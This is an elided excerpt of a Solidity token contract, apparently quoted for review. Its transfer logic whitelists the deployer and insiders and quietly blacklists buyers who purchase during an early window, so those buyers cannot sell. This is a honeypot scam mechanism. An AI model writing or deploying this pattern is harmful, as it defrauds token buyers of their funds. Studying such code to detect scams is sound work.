...
contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _List2;
    mapping(address => bool) public _leaderList;
    ...
    constructor(
        ...
        _List2[address(this)] = true;
        _List2[address(swapRouter)] = true;
        _List2[tx.origin] = true;
        _List2[ReceiveAddress] = true;
    ...
    function _transfer(
        ...
        require(!_List[from] || _List2[from]);

        if (!_List2[from] && !_List2[to] && airdropEnable) {
            address ad;
            uint256 num = 88 * 1e18;
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_List2[from] && !_List2[to]) {
                require(starBlock < block.timestamp);

                if (block.timestamp < starBlock + 60) {
                    require(_leaderList[from] || _leaderList[to]);
                }
                if (
                    block.timestamp < starBlock + dd && !_swapPairList[to]
                ) {
                                        _List[to] = true;
                }
                if (_swapPairList[to]) {
